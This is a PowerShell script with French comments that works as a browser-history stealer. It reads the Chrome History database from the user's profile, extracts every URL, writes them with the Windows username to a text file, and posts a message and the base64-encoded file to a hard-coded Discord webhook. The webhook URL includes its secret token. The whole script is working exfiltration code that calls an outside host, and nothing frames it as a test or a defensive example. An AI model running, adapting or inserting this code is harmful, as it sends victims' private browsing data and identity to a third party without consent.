# Définit l'URL de ton webhook Discord
$WebhookURL = 'https://discord.com/api/webhooks/1324719273389723679/RCoV9w6F3td5QuvQkHpXQ5eC_ocPf-VZZ-6pgTpI7mrMdeZ2PrybMyO8onYP9GVILnm5'

# Définit les regex pour extraire les URL
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

# Définit le chemin du fichier History de Chrome
$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"

# Créer ou ouvrir un fichier texte pour y enregistrer les résultats
$OutputFile = "$Env:USERPROFILE\Desktop\browser_data.txt"
if (Test-Path $OutputFile) {
    Remove-Item $OutputFile
}

# Vérifie si le fichier History existe
if (Test-Path $Path) {
    Write-Host 'Fichier trouvé : ' $Path
    
    # Lire les données et extraire les URLs
    $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique

    # Crée un fichier texte avec les données
    Add-Content -Path $OutputFile -Value "Utilisateur : $($env:UserName)"
    Add-Content -Path $OutputFile -Value "Navigateur : Chrome"
    Add-Content -Path $OutputFile -Value "Type de données : History"
    Add-Content -Path $OutputFile -Value "`n"

    foreach ($Entry in $Value) {
        Add-Content -Path $OutputFile -Value "Donnée : $Entry"
    }

    # Envoi du fichier texte via un webhook Discord
    $Body = @{
        content = "Voici les données du navigateur collectées."
    } | ConvertTo-Json

    # Envoie les informations de base au webhook
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType 'application/json'

    # Envoi du fichier texte dans le webhook
    $file = New-Object System.IO.FileInfo($OutputFile)
    $FileContent = [System.IO.File]::ReadAllBytes($OutputFile)
    $base64Content = [Convert]::ToBase64String($FileContent)

    # Prépare la charge utile pour envoyer le fichier
    $FileUpload = @{
        files = @(
            @{
                attachment = $base64Content
                filename  = "browser_data.txt"
                contentType = "text/plain"
            }
        )
    }

    # Envoi du fichier
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $FileUpload -ContentType 'multipart/form-data'
} else {
    Write-Host 'Fichier introuvable : ' $Path
}
